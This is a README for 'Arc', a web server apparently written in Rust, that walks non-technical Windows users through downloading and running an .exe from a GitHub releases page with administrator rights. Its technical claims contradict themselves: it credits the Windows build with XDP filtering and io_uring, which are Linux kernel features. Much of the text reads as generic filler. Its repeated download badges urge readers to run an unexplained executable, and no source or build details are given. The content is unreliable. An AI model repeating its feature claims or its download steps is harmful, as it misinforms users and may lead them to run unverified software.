# 🌀 Arc - Fast and Secure Web Server

[![Download Arc](https://img.shields.io/badge/Download-Arc-ff69b4?style=for-the-badge)](https://github.com/c-munene/Arc/releases)

---

Arc is a modern web server that works like Nginx but runs faster. It is built using Rust and designed to handle heavy traffic safely. This server comes with built-in protection against attacks and tools to control traffic flow. You can use it to host websites, manage connections, and secure your network.

---

## 🚀 Getting Started

This guide will help you download and run Arc on Windows. You don’t need to know programming. Follow each step carefully, and you will have Arc running in no time.

### What You Need
- A Windows PC (Windows 10 or Windows 11 recommended)
- 4 GB of free hard drive space
- An internet connection to download the software
- Administrator rights on your PC to install and run Arc

---

## 📥 Download Arc

To get Arc, you need to visit the releases page on GitHub. This page holds all the versions of Arc you can download.

**Click the link below to open the release page:**

[![Download Arc](https://img.shields.io/badge/Download-Arc-ff69b4?style=for-the-badge)](https://github.com/c-munene/Arc/releases)

---

## 🛠️ Install and Run Arc on Windows

Follow these steps to set up Arc.

### Step 1: Visit the Download Page
Go to the Arc release page using the link above.

### Step 2: Find the Latest Version
Look for the latest version of Arc. It usually appears at the top of the list with a date.

### Step 3: Download the Windows File
Under the latest version, find the file that ends with `.exe`. This is the installer for Windows. Click it and wait for the download to finish.

### Step 4: Open the Installer
Once downloaded, find the file on your computer. Double-click it to start the installation process.

### Step 5: Follow the Installation Prompts
The installer will open a small window. Follow the instructions. You can keep the default settings. When ready, click "Install."

### Step 6: Launch Arc
After installation, you can start Arc from the Start menu or by clicking the shortcut on your desktop.

---

## ⚙️ Basic Configuration

Arc works out of the box but can be customized.

### What You Can Change
- Your website’s address (domain)
- How much traffic Arc allows
- Security settings to prevent attacks
- Logging settings to track usage

### Important Files Location
- Configuration files will be in the folder where you installed Arc.
- Commonly, this folder is `C:\Program Files\Arc\config`.

Open the main config file with a text editor like Notepad. You can adjust settings there.

---

## 🔒 Built-in Security Features

Arc protects your server from common threats automatically. Here are some of its key defenses:

- **DDoS Protection:** Stops large attacks that try to overwhelm your server.
- **XDP Support:** Uses low-level network filtering for extra safety.
- **Rate Limiting:** Controls how many requests a user can make to prevent abuse.
- **TLS Encryption:** Keeps your data private by encrypting connections.

These features mostly work without extra setup. You can tweak them if needed in the config files.

---

## 🔄 Updating Arc

New versions bring fixes and improvements. To keep Arc working well:

1. Visit the [Arc releases page](https://github.com/c-munene/Arc/releases).
2. Download the newest `.exe` file.
3. Run the installer again. It will replace the old files safely.
4. Restart Arc after installation.

---

## 🖥️ Running Arc Manually (Optional)

If you want to run Arc without installing it, you can download the standalone `.exe` file from the releases page.

1. Download the file.
2. Open Windows Command Prompt (search for `cmd`).
3. Navigate to the folder with the `.exe` file using the `cd` command.
4. Run Arc by typing `Arc.exe` and pressing Enter.

This method is for users who want to test Arc or run it without full installation.

---

## 🗂️ Where to Get Help

If you run into trouble:

- Check the Arc README or documentation on GitHub.
- Look in the `logs` folder inside the Arc install directory.
- Visit the GitHub issues page to see if others faced the same issue.
- You may open a new issue or ask for help on the GitHub site.

---

## ℹ️ System Requirements

- Windows 10 or later (64-bit)
- 2 GHz or faster CPU
- 4 GB RAM or more
- 4 GB free disk space
- Network access for serving websites

Arc uses modern Windows features to be faster and safer than older servers.

---

## 🧰 Features at a Glance

- Handles HTTP/1.1 and HTTP/2 traffic
- Supports WebSocket connections
- Uses io_uring for fast input/output
- Efficiently balances loads across servers
- Provides logging and error tracking
- Supports TLS for secure connections
- Includes protection against various network attacks

---

## 🔗 Useful Links

- [Arc Releases Page](https://github.com/c-munene/Arc/releases) – Download the latest version
- [GitHub Issues](https://github.com/c-munene/Arc/issues) – Report problems or ask questions
- [Arc Documentation](https://github.com/c-munene/Arc/wiki) – Learn more about configuration and features (if available)

---

## 💡 Tips for Best Use

- Keep Arc updated to get the latest security patches.
- Regularly back up your configuration files.
- Review the logs often to spot unusual activity.
- Start with default settings and tweak gradually as you learn.

---

Arc is suitable for personal websites, small businesses, and anyone who needs a reliable, fast web server on Windows. The built-in protections help keep your server running smoothly with minimal intervention.